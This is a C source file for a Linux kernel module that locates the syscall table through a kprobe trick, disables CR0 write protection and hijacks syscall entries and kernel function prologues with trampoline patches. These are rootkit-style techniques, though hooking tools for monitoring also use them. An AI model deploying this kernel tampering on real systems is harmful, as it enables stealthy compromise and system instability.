#include "qrk_common.h"
#define KPROBE_PRE_HANDLER(fname) static int __kprobes fname(struct kprobe *p, struct pt_regs *regs)

void **syscall_table;
ptr_t kln_addr = 0;
ptr_t (*p_kallsyms_lookup_name)(const char *name) = NULL;

static struct kprobe kp0, kp1;
KPROBE_PRE_HANDLER(handler_pre0)
{
    kln_addr = (--regs->ip);
    return 0;
}
KPROBE_PRE_HANDLER(handler_pre1)
{
    return 0;
}
static int do_register_kprobe(struct kprobe *kp, char *symbol_name, void *handler)
{
    int ret;

    kp->symbol_name = symbol_name;
    kp->pre_handler = handler;

    ret = register_kprobe(kp);
    if (ret < 0)
    {
        dbg("register_probe() for symbol %s failed, returned %d\n", symbol_name, ret);
        return ret;
    }
    dbg("Planted kprobe for symbol %s at %p\n", symbol_name, kp->addr);
    return ret;
}

int init_kallsyms_lookup_name(void)
{
    int ret;
    ret = do_register_kprobe(&kp0, "kallsyms_lookup_name", handler_pre0);
    if (ret < 0)
        return ret;

    ret = do_register_kprobe(&kp1, "kallsyms_lookup_name", handler_pre1);
    if (ret < 0)
    {
        unregister_kprobe(&kp0);
        return ret;
    }
    unregister_kprobe(&kp0);
    unregister_kprobe(&kp1);

    dbg("kallsyms_lookup_name address = 0x%lx\n", kln_addr);

    p_kallsyms_lookup_name = (ptr_t(*)(const char *name))kln_addr;
    return 0;
}

ptr_t get_symbol(char *sym_name)
{
    if (p_kallsyms_lookup_name == NULL)
    {
        dbg("get_symbol: not INIT\n");
        return 0;
    }
    return p_kallsyms_lookup_name(sym_name);
}

ptr_t find_syscall_table(void)
{
    return get_symbol("sys_call_table");
}

int hook_init(void)
{
    int retval;
    retval = init_kallsyms_lookup_name();
    if (retval < 0)
        return retval;
    syscall_table = (void **)find_syscall_table();
    dbg("syscall_table: %lx\n", (ptr_t)syscall_table);

    dbg("__NR_open: %p",syscall_table[__NR_open]);
    dbg("__NR_read: %p",syscall_table[__NR_read]);
    dbg("__NR_write: %p",syscall_table[__NR_write]);
    dbg("__NR_execve: %p",syscall_table[__NR_execve]);
    dbg("__NR_getdents: %p",syscall_table[__NR_getdents]);
    dbg("__NR_getdents64: %p",syscall_table[__NR_getdents64]);

    if (!syscall_table)
        return -EINVAL;

    return retval;
}

void hook_exit(void)
{
}

static inline void mywrite_cr0(unsigned long cr0)
{
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0"
                 : "+r"(cr0), "+m"(__force_order));
}
void enable_write_protection(void)
{
    unsigned long cr0;
    cr0 = read_cr0();
    set_bit(16, &cr0);
    mywrite_cr0(cr0);
    preempt_enable();
}
void disable_write_protection(void)
{
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    clear_bit(16, &cr0);
    mywrite_cr0(cr0);
}

void set_addr_rw(unsigned long addr) {

    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;

}

void set_addr_ro(unsigned long addr) {

    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);

    pte->pte = pte->pte &~_PAGE_RW;

}

void inc_critical(struct mutex *lock, int *counter)
{
	/* lock access mutex */
	mutex_lock(lock);
	(*counter)++;

	/* unlock access mutex */
	mutex_unlock(lock);
}

/* decrement counter of a critical section */
void dec_critical(struct mutex *lock, int *counter)
{

	/* lock access mutex */
	mutex_lock(lock);
	(*counter)--;

	/* unlock access mutex */
	mutex_unlock(lock);
}


LIST_HEAD(hooked_syscall_table_syms);

void syscall_table_hijack_start(int syscall_number, void *newfn)
{
    struct hijack_internal *sa;
    dbg("Hooking syscall %d\n", syscall_number);
    list_for_each_entry(sa, &hooked_syscall_table_syms, list) 
        if (syscall_number == sa->syscall_number)
        {
            dbg("warning: syscall_number %d has been hooked, nothing to do",syscall_number);
            return;
        }

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if (!sa)
        return;

    sa->syscall_number = syscall_number;
    sa->origin_fn = (void *)syscall_table[syscall_number];
    sa->new_fn = newfn;
    dbg(" sa->new_fn0: %p", sa->new_fn);
    list_add(&sa->list, &hooked_syscall_table_syms);


    disable_write_protection();
    syscall_table[sa->syscall_number] = sa->new_fn;
    enable_write_protection();
}
void syscall_table_hijack_stop(int syscall_number)
{
    struct hijack_internal *sa;

    dbg("Unhooking syscall %d\n", syscall_number);

    list_for_each_entry(sa, &hooked_syscall_table_syms, list) 
        if (syscall_number == sa->syscall_number)
        {
            disable_write_protection();

            // do restore
            syscall_table[sa->syscall_number] = sa->origin_fn;
            enable_write_protection();
            list_del(&sa->list);
            kfree(sa);
            break;
        }
}

struct hijack_internal* syscall_table_hijack_get0(int syscall_number){
    struct hijack_internal *sa;
    list_for_each_entry(sa, &hooked_syscall_table_syms, list) 
        if (syscall_number == sa->syscall_number)
        {
            return sa;
        }
    return NULL;
}

void syscall_table_hijack_pause(void){
    struct hijack_internal *sa;

    list_for_each_entry(sa, &hooked_syscall_table_syms, list) 
        {
            disable_write_protection();
            syscall_table[sa->syscall_number] = sa->origin_fn;
            enable_write_protection();
        }
}

void syscall_table_hijack_resume(void){
    struct hijack_internal *sa;
    list_for_each_entry(sa, &hooked_syscall_table_syms, list) 
        {
            disable_write_protection();
            syscall_table[sa->syscall_number] = sa->new_fn;
            enable_write_protection();
        }
}


LIST_HEAD(hooked_asm_syms);
void asm_hijack_start(void *oldfn, void *newfn)
{
    struct sym_hook *sa;
    unsigned char origin_code[HIJACK_SIZE], new_code[HIJACK_SIZE];

    #if defined(_CONFIG_X86_)

    // push $addr; ret
    memcpy(new_code, "\x68\x00\x00\x00\x00\xc3", HIJACK_SIZE);
    *(unsigned long *)&new_code[1] = (unsigned long)newfn;
    #elif defined(_CONFIG_X86_64_)

    // mov rax, $addr; jmp rax
    memcpy(new_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HIJACK_SIZE);
    *(unsigned long *)&new_code[2] = (unsigned long)newfn;
    
    #else
    
    #error "err arch"

    #endif

    dbg("Hooking oldfn 0x%p with 0x%p\n", oldfn, newfn);

    list_for_each_entry(sa, &hooked_asm_syms, list) 
        if (oldfn == sa->old_fn)
        {
            dbg("warning: oldfn 0x%p has been hooked, nothing to do",oldfn);
            return;
        }

    memcpy(origin_code, oldfn, HIJACK_SIZE);

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if ( ! sa )
        return;

    sa->old_fn = oldfn;
    sa->new_fn = newfn;
    memcpy(sa->o_code, origin_code, HIJACK_SIZE);
    memcpy(sa->n_code, new_code, HIJACK_SIZE);
    list_add(&sa->list, &hooked_asm_syms);

    disable_write_protection();
    memcpy(oldfn, new_code, HIJACK_SIZE);
    enable_write_protection();

    dbg("end asm_hijack_start");
}
void asm_hijack_stop(void *newfn)
{
    struct sym_hook *sa;
    dbg("stop newfn hook 0x%p\n", newfn);

    list_for_each_entry ( sa, &hooked_asm_syms, list )
        if ( newfn == sa->new_fn )
        {
            
            disable_write_protection();
            memcpy(sa->old_fn, sa->o_code, HIJACK_SIZE);
            enable_write_protection();

            list_del(&sa->list);
            kfree(sa);
            break;
        }

}
void asm_hijack_resume(void *newfn)
{
    struct sym_hook *sa;
    dbg("resume newfn hook 0x%p\n", newfn);

    list_for_each_entry ( sa, &hooked_asm_syms, list )
        if ( newfn == sa->new_fn )
        {
            disable_write_protection();
            memcpy(sa->old_fn, sa->n_code, HIJACK_SIZE);
            enable_write_protection();
            break;
        }

}
void* asm_hijack_pause(void *newfn)
{
    struct sym_hook *sa;
    dbg("Pausing newfn hook 0x%p\n", newfn);

    list_for_each_entry ( sa, &hooked_asm_syms, list )
        if ( newfn == sa->new_fn )
        {
            disable_write_protection();
            memcpy(sa->old_fn, sa->o_code, HIJACK_SIZE);
            enable_write_protection();
            return sa->old_fn;
        }
    return NULL;
}

void* asm_hijack_getaddr(void *newfn)
{
    struct sym_hook *sa;
    list_for_each_entry ( sa, &hooked_asm_syms, list )
        if ( newfn == sa->new_fn )
        {
            return sa->old_fn;
        }
    return NULL;
}


void dbg_pt_regs(const struct pt_regs *regs){
#if defined(_CONFIG_X86_64_)

    dbg("dbg_pt_regs: ");
    dbg("\t%%rax=0x%lx",regs->ax);
    dbg("\t%%rdi=0x%lx\t%%rsi=0x%lx\t%%rdx=0x%lx\n",regs->di,regs->si,regs->dx);
    dbg("\t%%rcx=0x%lx\t%%r8=0x%lx\t%%r9=0x%lx\n",regs->cx,regs->r8,regs->r9);
#elif defined(_CONFIG_X86_)

#else
#error "err arch"
#endif
}

unsigned long get_param_from_regs(const struct pt_regs *regs, int n){
#if defined(_CONFIG_X86_64_)
    switch(n){
        case 0:
            return regs->ax;
        case 1:
            return regs->di;
        case 2:
            return regs->si;
        case 3:
            return regs->dx;
        case 4:
            return regs->cx;
        case 5:
            return regs->r8;
        case 6:
            return regs->r9;
    }
#elif defined(_CONFIG_X86_)

#else
    #error "err arch"
#endif
    return 0;
}

char* str_remove_duplicates(char *str) {
    char *w = str;
    char *r = str;
    char last_char = 'a';

    set_addr_rw((ptr_t) str);

    while (*r) {
        if (*r == '/') {
            if (last_char != '/') {
                *w++ = *r;
                last_char = *r;
            }
        } else {
            *w++ = *r;
            last_char = *r;
        }
        r++;
    }

    *w = 0;
    set_addr_ro((ptr_t) str);

    return str;
}